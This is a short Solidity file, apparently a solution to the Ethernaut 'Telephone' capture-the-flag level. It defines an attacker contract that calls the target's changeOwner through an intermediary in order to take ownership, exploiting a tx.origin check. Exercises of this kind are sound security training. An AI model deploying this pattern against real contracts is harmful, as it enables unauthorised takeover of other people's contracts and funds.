// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "contracts/Telephone.sol";
contract TelephoneAttacker{

    Telephone public telephoneEthernaut;
    constructor(address _telephoneEthernaut){
        telephoneEthernaut = Telephone(_telephoneEthernaut);
    }

    function changeTheOwner(address _address) public {
        telephoneEthernaut.changeOwner(_address);
    }

}